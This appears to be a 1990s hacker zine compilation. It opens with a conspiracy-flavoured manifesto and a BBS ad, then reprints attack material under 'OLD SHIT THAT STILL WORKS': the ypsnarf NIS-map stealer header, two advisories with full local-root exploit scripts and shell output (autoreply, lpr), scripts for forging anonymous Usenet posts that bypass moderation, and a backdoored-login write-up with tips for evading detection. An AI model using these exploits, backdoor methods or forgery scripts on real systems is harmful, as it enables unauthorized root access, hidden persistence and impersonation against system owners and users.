The front of this classic shirt displays "Legion of Doom Internet World
Tour" as well as a sword and telephone intersecting the planet

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
                   The SenseReal Mission
  If you are reading this it indicates you have reached a point
along your journey that you will have to decide whether you agree
with The SenseReal Foundation or whether you think that those who
believe and support The SenseReal Foundation are crazy. Your
decision to join The SenseReal Foundation on it's mission will
undoubtedly change your life forever. When you understand the
reason it exists and what it seeks you will better know how to
decide. That is why this text was created.
  He is known as Green Ghost. Some know him as Jim Nightshade. He
was born in 1966. He is not a baby boomer and he is not a
Generation Xer. He falls into that group of the population that
has so far escaped definition. He is a (yberpunk. He was (yberpunk
before (yberpunk was cool. He is the founder and leader of The
SenseReal Foundation. You will learn more about him later.
  But first you will have to know about the background. There once
was a man named Albert Hoffman. In 1943, on April 16 Hoffman
absorbed a threshold amount of the drug known as LSD. He
experienced "a peculiar restlessness". LSD since that time has
played an important role in this world.
  There are other agents involved in the story. Mary Pinchot, JFK,
Nixon, Charles Manson, Jimi Hendrix, Timothy Leary, Elvis Presley
and many others. There are too many details and explanations
necessary to explain everything here. But this does not matter.
  Because the SenseReal Foundation is about riding the wave. We
believe that the ultimate goal cannot be defined. To define it
would be to destroy it.
  The SenseReal Foundation hopes that things can be changed for
the better. But we realize that the situation can become
much worse. From what history teaches us and what we instinctively
feel, we know that there is a great probability that things will
get much worse before and if things ever get better. Doom looms
on the horizon like an old friend.
  Freedom is being threatened every day and The SenseReal
Foundation seeks to defend and seek Freedom. Big Brother is here
NOW and to deny his existence is only to play into his hand. The
goal of our government both here in America and worldwide is to
remain in power and increase it's control of The People. To
expose Big Brother and destroy him is one of the many goals of
The SenseReal Foundation.
  As a member of (yberspace and an agent of The SenseReal
Foundation you will have to carefully consider your interaction
with the flow of Info. The ideals of Liberty must be maintained.
  The SenseReal Foundation provides a grounding point. The place
where the spark transfers from plasma to light and back to plasma.
Tesla was not on the wrong track. The SenseReal Foundation is a
mechanism which seeks to increase Freedom. Only by learning more
can we defeat the Evil. The Good must prevail.
  If you have the Hacker spirit and think along the same lines
then The SenseReal Foundation may be your calling. If you think
like J.R. Dobbs or Green Ghost then it is possible we can make it
through The Apocalypse. A final date has never been announced for
this event. Green Ghost does not claim to know the exact date but
he does claim to have some Info on it.
  Green Ghost does not claim to have all the answers or even to
know all the questions. He was first exposed to computers in the
early 70's at his local high school. The first computer he ever
used was a Honeywell terminal connected to a mainframe operated
at the home office of Honeywell and operated for the school.
  This machine was programed by feeding it stacks of cards with
boxes X'd out with a No. 2 pencil. It did have a keyboard hooked
up to a printer which served for the monitor. The text was typed
out and the paper rolled out of the machine in great waves.
This experience left him wanting more. Somewhere between the
machine and the mind were all the questions and all the answers.
  The SenseReal Foundation will supply some of the means. We
must all work together if we are to succeed. UNITED WE STAND,
DIVIDED WE FALL. If you wish to participate with The SenseReal
Foundation you must devote yourself to becoming an Info Agent.
  As an Info Agent it is your duty to seek Truth and Knowledge
out wherever it is located. To Learn and to seek to increase
the Learning of all at The SenseReal Foundation. Different
people will be needed to help out in different ways.
  SenseReal's Info Agents are located all around the world and
are in contact with fellow SenseReal members via any one of
several SenseReal facilities. The primary establishment and
headquarters of The SenseReal Foundation is SenseReal's own
online system:
       T /-/ E  /-/ /=\ ( /< E R ' S  /\/\ /=\ /\/ S / O /\/
            >>>::: 1 - 8 0 3 - 7 8 5 - 5 0 8 0 :::<<<
 27 Hours Per Day  /14.4 Supra /Home of The SenseReal Foundation
Also contact via SenseReal's mail drop by writing or sending
materials to:   TSF              \   Electronic Mail:

      HILTON HEAD, SC 29938-6914 \
  The Hacker's /\/\ansion is a system like no other. While it is
not your typical Hackers board it has much Info on Hacking. While
it is not like any Adult system you've ever seen it has the most
finest Adult material available anywhere. It is not a Warez board
but we are definitely Pirates. Because we are (yberpunks. What
makes the Hacker's Mansion different is our emphasis on quality.
  Everything that you find at The /-/acker's /\/\ansion is 1ST
(lass. All the coolest E-zines are pursued here. Phrack, CUD, and
Thought Virus to name just a few. Of course there is one other
source for Thought Virus:

In the subject or body of the message write:

and you will receive the current issue in your E-Mail box in no
time.  If you wish to join the Thought Criminals mailing list and
communicate with your fellow Thought Criminals via E-Mail then
send another message to: ListServ@neonate.atl.ga.us

or simply: Subscribe ThoughtCriminals
To mail others on the Thought Criminals mailing list send a message
to: ThoughtCriminals@neonate.atl.ga.us
Tell us all. Communication is vital. Our survival may depend on
it. The SenseReal Foundation is about the allegiance of many
people, and indeed beings, as our friends from other planets can
tell you. The EFF inspired us and was a model but we don't have
the EFF's money so we need YOU. If you are someone who can
contribute or who believes in The Cause or are just interested
in Tax Resistance or the Free The Weed movement then you should
join The SenseReal Foundation today. Contact us through any of
above channels and become a Freedom Fighter today. Time is of
the essence.

                    ** OLD SHIT THAT STILL WORKS **

                           -  sometimes  -

/*
 * THIS PROGRAM EXERCISES SECURITY HOLES THAT, WHILE GENERALLY KNOWN IN
 * THE UNIX SECURITY COMMUNITY, ARE NEVERTHELESS STILL SENSITIVE SINCE
 * IT REQUIRES SOME BRAINS TO TAKE ADVANTAGE OF THEM.  PLEASE DO NOT
 * REDISTRIBUTE THIS PROGRAM TO ANYONE YOU DO NOT TRUST COMPLETELY.
 *
 * ypsnarf - exercise security holes in yp/nis.
 *
 * Based on code from Dan Farmer (zen@death.corp.sun.com) and Casper Dik
 * (casper@fwi.uva.nl).
 *
 * Usage:
 *  ypsnarf server client
 *   - to obtain the yp domain name
 *  ypsnarf server domain mapname
 *   - to obtain a copy of a yp map
 *  ypsnarf server domain maplist
 *   - to obtain a list of yp maps
 *
 * In the first case, we lie and pretend to be the host "client", and send
 * a BOOTPARAMPROC_WHOAMI request to the host "server".  Note that for this
 * to work, "server" must be running rpc.bootparamd, and "client" must be a
 * diskless client of (well, it must boot from) "server".
 *
 * In the second case, we send a YPPROC_DOMAIN request to the host "server",
 * asking if it serves domain "domain".  If so, we send YPPROC_FIRST and
 * YPPROC_NEXT requests (just like "ypcat") to obtain a copy of the yp map
 * "mapname".  Note that you must specify the full yp map name, you cannot
 * use the shorthand names provided by "ypcat".
 *
 * In the third case, the special map name "maplist" tells ypsnarf to send
 * a YPPROC_MAPLIST request to the server and get the list of maps in domain
 * "domain", instead of getting the contents of a map.  If the server has a
 * map called "maplist" you can't get it.  Oh well.
 *
 * Since the callrpc() routine does not make any provision for timeouts, we
 * artificially impose a timeout of YPSNARF_TIMEOUT1 seconds during the
 * initial requests, and YPSNARF_TIMEOUT2 seconds during a map transfer.
 *
 * This program uses UDP packets, which means there's a chance that things
 * will get dropped on the floor; it's not a reliable stream like TCP.  In
 * practice though, this doesn't seem to be a problem.
 *
 * To compile:
 *  cc -o ypsnarf ypsnarf.c -lrpcsvc

[8lgm]-Advisory-2.UNIX.autoreply.12-Jul-1991

PROGRAM:

 autoreply(1) (/usr/local/bin/autoreply)
   Supplied with the Elm Mail System

VULNERABLE OS's:

 Any system with a standard installation of The Elm Mail System.
 All versions are believed to have this vulnerability.

DESCRIPTION:

 autoreply(1) can be used to create root owned files, with mode
 666.  It can also overwrite any file with semi user-controlled
 data.

IMPACT:

 Any user with access to autoreply(1) can alter system files and
 thus become root.

REPEAT BY:

 This example demonstrates how to become root on most affected
 machines by modifying root's .rhosts file.  Please do not do
 this unless you have permission.

 Create the following script, 'fixrhosts':

8<--------------------------- cut here ----------------------------
#!/bin/sh
#
# fixrhosts rhosts-file user machine
#
if [ $# -ne 3 ]; then
 echo "Usage: `basename $0` rhosts-file user machine"
 exit 1
fi
RHOSTS="$1"
USERNAME="$2"
MACHINE="$3"
cd $HOME
echo x > "a
$MACHINE $USERNAME
b"
umask 022
autoreply "a
$MACHINE $USERNAME
b"
cat > /tmp/.rhosts.sh.$$ << 'EOF'
ln -s $1 `echo $$ | awk '{printf "/tmp/arep.%06d", $1}'`
exec autoreply off
exit 0
EOF
/bin/sh /tmp/.rhosts.sh.$$ $RHOSTS
rm -f /tmp/.rhosts.sh.$$ "a
$MACHINE $USERNAME
b"
exit 0
8<--------------------------- cut here ----------------------------

 (Lines marked with > represent user input)

> % id
 uid=97(8lgm) gid=97(8lgm) groups=97(8lgm)
> % ./fixrhosts ~root/.rhosts 8lgm localhost
 You've been added to the autoreply system.
 You've been removed from the autoreply table.
> % rsh localhost -l root csh -i
 Warning: no access to tty.
 Thus no job control in this shell.
 #


FIX:

 1. Disable autoreply.
 2. Wait for a patch from the Elm maintainers.

[8lgm]-Advisory-3.UNIX.lpr.19-Aug-1991

PROGRAM:

 lpr(1)  (/usr/ucb/lpr or /usr/bin/lpr)

VULNERABLE OS's:

 SunOS 4.1.1 or earlier
 BSD 4.3
 BSD NET/2 Derived Systems
 A/UX 2.0.1

 Most systems supporting the BSD LP subsystem


DESCRIPTION:

 lpr(1) can be used to overwrite or create (and become owner of)
 any file on the system.  lpr -s allows users to create symbolic
 links in lpd's spool directory (typically /var/spool/lpd).
 After 1000 invocations of lpr, lpr will reuse the filename in
 the spool directory, and follow the link previously installed.
 It will thus overwrite/create any file that this link points too.

IMPACT:

 Any user with access to lpr(1) can alter system files and thus
 become root.

REPEAT BY:

 This example demonstrates how to become root on most affected
 machines by modifying /etc/passwd and /etc/group.  Please do
 not do this unless you have permission.

 Create the following script, 'lprcp':

8<--------------------------- cut here ----------------------------
#!/bin/csh -f
#
# Usage: lprcp from-file to-file
#

if ($#argv != 2) then
 echo Usage: lprcp from-file to-file
 exit 1
endif

# This link stuff allows us to overwrite unreadable files,
# should we want to.
echo x > /tmp/.tmp.$$
lpr -q -s /tmp/.tmp.$$
rm -f /tmp/.tmp.$$  # lpr's accepted it, point it
ln -s $2 /tmp/.tmp.$$  # to where we really want

@ s = 0
while ( $s != 999)  # loop 999 times
 lpr /nofile >&/dev/null # doesn't exist, but spins the clock!
 @ s++
 if ( $s % 10 == 0 ) echo -n .
end
lpr $1    # incoming file
    # user becomes owner
rm -f /tmp/.tmp.$$
exit 0
8<--------------------------- cut here ----------------------------

 (Lines marked with > represent user input)

Make copies of /etc/passwd and /etc/group, and modify them:
> % id
 uid=97(8lgm) gid=97(8lgm) groups=97(8lgm)
> % cp /etc/passwd /tmp/passwd
> % ex /tmp/passwd
 /tmp/passwd: unmodified: line 42
> :a
> 8lgmroot::0:0:Test account for lpr bug:/:/bin/csh
> .
> :wq
 /tmp/passwd: 43 lines, 2188 characters.
> % cp /etc/group /tmp
> % ex /tmp/group
 /tmp/group: unmodified: line 49
> :/wheel
 wheel:*:0:root,operator
> :c
> wheel:*:0:root,operator,8lgm
> .
> :wq
 /tmp/group: 49 lines, 944 characters.

Install our new files:
> % ./lprcp /tmp/group /etc/group
 ................................................................
 ...................................
 lpr: cannot rename /var/spool/lpd/cfA060testnode
> % ./lprcp /tmp/passwd /etc/passwd
 .................................................................
 ..................................
 lpr: cannot rename /var/spool/lpd/cfA061testnode

Check it worked:
> % ls -l /etc/passwd /etc/group
 -rw-r--r--    1 8lgm          944 Mar  3 19:56 /etc/group
 -rw-r--r--    1 8lgm         2188 Mar  3 19:59 /etc/passwd
> % head -1 /etc/group
 wheel:*:0:root,operator,8lgm
> % grep '^8lgmroot' /etc/passwd
 8lgmroot::0:0:Test account for lpr bug:/:/bin/csh

Become root and tidy up:
> % su 8lgmroot
 # chown root /etc/passwd /etc/group
 # rm -f /tmp/passwd /tmp/group
 #

FIX:

 1. Contact your vendor for a fix.
 2. In the meantime, apply the following patch, derived from
    BSD NET/2 source, which will correct the flaw on most
    affected systems:

------------------------------------------------------------------------------

          Anonymous netnews without "anonymous" remailers

Save any news article to a file.  We'll call it "hak" in this example.
Edit hak, and remove any header lines of the form

 From some!random!path!user   (note: "From ", not "From: " !!)
 Article:
 Lines:

Shorten the Path: header down to its LAST two or three "bangized" components.
This is to make the article look like it was posted from where it really was
posted, and originally hit the net at or near the host you send it to.  Or
you can construct a completely new Path: line to reflect your assumed alias.

Make some change to the Message-ID: field, that isn't likely to be
duplicated anywhere.  This is usually best done by adding a couple of
random characters to the part before the @, since news posting programs
generally use a fixed-length field to generate these IDs.

Change the other headers to say what you like -- From:, Newsgroups:,
Sender:, etc.  Replace the original message text with your message.
If you are posting to a moderated group, remember to put in an Approved:
header to bypass the moderation mechanism.

Write out the changed file, and send it to your favorite NNTP server that
permits transfers via the IHAVE command, using the following script:

=======================
#! /bin/sh
## Post an article via IHAVE.
## args: filename server

if test "$2" = "" ; then
  echo usage: $0 filename server
  exit 1
fi
if test ! -f $1 ; then
  echo $1: not found
  exit 1
fi

# suck msg-id out of headers, keep the brackets
msgid=`sed -e '/^$/,$d' $1 | egrep '^[Mm]essage-[Ii][Dd]: ' | \
  sed 's/.*-[Ii][Dd]: //'`
echo $msgid

( sleep 5
  echo IHAVE $msgid
  sleep 3
  cat $1
  sleep 1
  echo "."
  sleep 1
  echo QUIT ) | telnet $2 119
=======================

If your article doesn't appear in a day or two, try a different server.
They are easy to find.  Here's a script that will break a large file
full of saved netnews into a list of hosts to try.  Edit the output
of this if you want, to remove obvious peoples' names and other trash.

=======================
#! /bin/sh
FGV='fgrep -i -v'
egrep '^Path: ' $1 | sed -e 's/^Path: //' -e 's/!/\
/g' | sort -u | fgrep . | $FGV .bitnet | $FGV .uucp
=======================

Once you have your host list, feed it to the following script.

=======================
#! /bin/sh

while read xx ; do
if test "$xx" = "" ; then continue;
fi
echo === $xx
( echo open $xx 119
  sleep 5
  echo ihave k00l@x.edu
  sleep 4
  echo .
  echo quit
  sleep 1
  echo quit
) | telnet
done
=======================

If the above script is called "findem" and you're using csh, you should do

 findem < list >& outfile

so that ALL output from telnet is captured.  This takes a long time, but when
it finishes, edit "outfile" and look for occurrences of "335".  These mark
answers from servers that might be willing to accept an article.  This isn't a
completely reliable indication, since some servers respond with acceptance and
later drop articles.  Try a given server with a slightly modified repeat of
someone else's message, and see if it eventually appears.

You will notice other servers that don't necessarily take an IHAVE, but
say "posting ok".  You can probably do regular POSTS through these, but they
will add an "NNTP-Posting-Host: " header containing the machine YOU came from.

Magic Login - Written by Data King - 7 July 1994

PLEASE NOTE:-

     This program code is released  on the understanding  that neither the
     author or Phrack  Magazine suggest that you implement this on **ANY**
     system that you are not authorized to do so. The author provides this
     implementation of a "Magic"  login as a learning exercise in security
     programming.

Sorry for the disclaimer readers but I was advised by the AFP (Australian
Federal Police) that if I ever released this code they would bust me for
aiding and abetting. I am releasing it anyway as I believe in the right of
people to KNOW, but not necessarily to DO.

As always I can be emailed at dking@suburbia.apana.org.au
(Please note:- I have a NEW pgp signature.)

INTRODUCTION
~~~~~~~~~~~~
Briefly I am going to explain what a "Magic" login is and some of the steps you
need to go through to receive the desired result. At the end of this article is
a diff that can be applied to the shadow-3.2.2-linux archive to implement some
of these ideas.

EXPLANATION
~~~~~~~~~~~
A "Magic" login is a modified login program that allows the user to login
without knowing the correct password for the account they are logging into.

This is a very simple programming exercise and can be done by almost anyone, but
a really effective "Magic" login program will do much more than this. The
features of the supplied "Magic" login are:

     - Will login to any valid account as long as you know the Magic password.

     - Hides you in UTMP
[B
     - Does not Log to WTMP

     - Allows Root Login from NON authorized Terminals

     - Preserves the Lastlogin information (ie Keeps it as though you had never
       logged in with the magic password)

     - Produces a binary that is exactly the same length as the original binary.

IMPLEMENTATION
~~~~~~~~~~~~~~
I am not going to go into great detail here on how to write such a system as
this. The code is very simple and it contains plenty of comments, so just look
there for ideas.

For this system to have less chance of being detected you need to do several
things.

First select a "Magic" password that is not easily identifiable by stringing the
binary. This is why in the example I have used the word "CONSOLE", this word
already appears several times in the binary so detection of one more is
unlikely.

Admittedly I could of encrypted the "Magic" password, but I decided against this
for several reasons.

The second thing you would need to do if you where illegally placing a "Magic"
login on a system would be to ensure that the admins are not doing CRC checks on
SUID(0) programs, or if they are that you change the CRC record of login to
match the CRC record of the "Magic" login.

Thirdly do not forget to make the date and time stamp of the new binary match
the old ones.

To install a new /bin/login on a system you will need to be root, now if you are
already root why would you bother? Simple, it is just one more backdoor that you
can use to get back in if you are detected.

LIMITATIONS
~~~~~~~~~~~
This version of the "Magic" login program does not have the following features,
I leave it entirely up to you about implementing something to fix them:

     - Shells & Programs show up in the Process Table

     - tty Ownership and attributes

     - /proc filesystem

Any one of these to an alert system admin will show that there is an "invisible"
user on the system. However it has been my experience that most admin's rarely
look at these things, or if they do they can not see the wood for the trees.
